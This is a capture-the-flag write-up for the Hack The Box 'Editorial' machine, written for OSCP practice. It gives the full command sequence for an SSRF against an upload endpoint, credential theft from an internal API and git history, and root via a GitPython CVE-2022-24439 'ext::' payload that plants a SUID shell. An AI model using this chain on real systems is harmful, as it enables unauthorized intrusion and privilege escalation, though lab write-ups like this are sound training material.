## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)

- **Exploits Used:**  
  - SSRF in image upload to hit internal Flask API  
  - Internal API enumeration for dev SSH creds  
  - Git repo recovery for prod SSH creds  
  - CVE‑2022‑24439 GitPython “ext::” RCE via sudo  

**Open Ports:**  
- [SSH](SSH) 22/tcp  
- [HTTP](HTTP) 80/tcp  

**Tools:**  
nmap, ffuf, feroxbuster, Burp Suite, curl, git‑dumper, git, unzip/zip, Python 3 (requests), sshpass  

---

## Recon 🔍  
```bash
nmap -p- --min-rate 10000 10.10.11.20
```

```
nmap -p 22,80 -sCV       10.10.11.20
```

```

# Fuzz internal ports via SSRF endpoint
ffuf -u http://editorial.htb/upload-cover \
     -request ssrf.request \
     -w <(seq 0 65535) -ac
```

---

## Shell as dev 🐚  
1. **Exploit SSRF** on `/upload-cover` by supplying `http://127.0.0.1:5000` → retrieve JSON from internal API.  
2. **Enumerate endpoints**, hit `/api/latest/metadata/messages/authors` → leak:  
   ```
   Username: dev
   Password: dev080217_devAPI!@
   ```  
3. **SSH in** as dev:  
   ```bash
   sshpass -p 'dev080217_devAPI!@' ssh dev@editorial.htb
   cat user.txt
   ```

---

## Shell as prod 👤  
1. **Recover deleted apps repo** in `~/apps/.git`:  
   ```bash
   cd ~/apps
   git checkout .
   ```  
2. **Inspect git history** (`git log`) and diff `app_api/app.py` → find prod creds:  
   ```
   Username: prod
   Password: 080217_Producti0n_2023!@
   ```  
3. **SSH in** as prod:  
   ```bash
   sshpass -p '080217_Producti0n_2023!@' ssh prod@editorial.htb
   ```

---

## Shell as root 👑  
1. **Check sudo:**  
   ```bash
   sudo -l
   # Allows: python3 clone_prod_change.py *
   ```  
2. **Abuse GitPython RCE (CVE‑2022‑24439):**  
   ```bash
   sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py \
     'ext::sh -c "cp /bin/sh /tmp/rootshell; chmod 4755 /tmp/rootshell"'
   /tmp/rootshell -p
   whoami   # → root
   cat /root/root.txt
   ```

---

## Actions Learned 🎓  
- SSRF pivot to internal API  
- Automated API enumeration for creds  
- Git repo forensic recovery  
- GitPython protocol extension RCE via sudo  
- Crafting SUID shell via RCE  

---

## References 🔗  
- [CVE‑2022‑24439 — GitPython protocol.ext.allow exploit](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)  
- Flask SSRF patterns in image‑upload handlers  
- GitPython `clone_from(..., multi_options=["-c protocol.ext.allow=always"])` behavior